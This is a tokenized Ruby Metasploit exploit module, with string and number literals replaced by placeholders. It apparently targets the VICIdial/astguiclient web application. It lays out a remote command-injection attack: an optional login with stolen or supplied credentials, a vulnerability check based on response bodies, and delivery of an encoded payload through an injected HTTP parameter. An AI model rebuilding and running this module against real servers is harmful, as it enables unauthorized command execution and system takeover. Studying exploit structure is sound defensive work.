require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> , <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > <str> , <str> = > true , <str> = > [ <str> ] , <str> = > { <str> = > true , <str> = > <int> , <str> = > { <str> = > <str> , <str> = > <str> , } } , <str> = > [ [ <str> , { <str> = > ARCH_CMD , <str> = > <str> } ] ] , <str> = > <int> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ false , <str> , <str> ] ) , OptString . new ( <str> , [ false , <str> , <str> ] ) , OptString . new ( <str> , [ false , <str> , <str> ] ) , OptString . new ( <str> , [ false , <str> , <str> ] ) ] , self . class ) end def login begin res = send_request_cgi ( { <str> = > <str> , <str> = > <str> , <str> = > { <str> = > datastore [ <str> ] , <str> = > datastore [ <str> ] , <str> = > datastore [ <str> ] , <str> = > datastore [ <str> ] } } ) rescue :: Rex :: ConnectionError vprint_error ( <str> rhost <str> rport <str> ) return nil end return res end def astguiclient_creds? if datastore [ <str> ] . nil? or datastore [ <str> ] . empty? return false end if datastore [ <str> ] . nil? or datastore [ <str> ] . empty? return false end if datastore [ <str> ] . nil? or datastore [ <str> ] . empty? return false end if datastore [ <str> ] . nil? or datastore [ <str> ] . empty? return false end return true end def request ( cmd , timeout = <int> ) begin res = send_request_cgi ( { <str> = > <str> , <str> = > <str> , <str> = > { <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > rand_text_alpha ( <int> ) , <str> = > <str> , <str> = > <str> cmd <str> , <str> = > datastore [ <str> ] , <str> = > datastore [ <str> ] } } , timeout ) rescue :: Rex :: ConnectionError vprint_error ( <str> rhost <str> rport <str> ) return nil end return res end def check res = request ( <str> ) if res and res . code == <int> if res . body =~ <str> vprint_error ( <str> ) return Exploit :: CheckCode :: Detected elsif res . body =~ <str> vprint_error ( <str> ) return Exploit :: CheckCode :: Detected elsif res . body =~ <str> return Exploit :: CheckCode :: Vulnerable end end return Exploit :: CheckCode :: Safe end def exploit print_status ( <str> ) res = request ( <str> ) unless res and res . code == <int> fail_with ( Failure :: Unknown , <str> peer <str> ) end if res . body =~ <str> fail_with ( Failure :: NoAccess , <str> peer <str> ) end if res . body =~ <str> fail_with ( Failure :: NoAccess , <str> peer <str> ) unless astguiclient_creds? print_error ( <str> ) res = login unless res and res . code == <int> and res . body =~ <str> fail_with ( Failure :: NoAccess , <str> peer <str> ) end res = request ( <str> ) end unless res and res . code == <int> and res . body =~ <str> fail_with ( Failure :: NotVulnerable , <str> peer <str> ) end print_good ( <str> ) request ( <str> payload . encoded <str> , <int> ) end end 
